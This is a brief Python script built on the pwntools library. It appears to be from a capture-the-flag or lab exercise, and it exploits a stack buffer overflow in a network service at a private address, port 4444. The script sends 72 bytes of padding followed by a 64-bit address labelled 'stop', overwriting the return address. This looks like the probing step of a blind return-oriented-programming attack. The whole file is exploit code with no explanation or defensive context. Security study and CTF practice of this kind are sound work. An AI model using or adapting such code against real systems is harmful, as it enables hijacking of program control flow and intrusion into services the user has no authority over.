from pwn import*
context.log_level = "debug"
p = remote('192.168.10.185',4444)

stop = 0x4005c0
payload = 'a'*72 + p64(stop)
p.recv()
p.sendline(payload)
p.recv()
pause()
p.close()
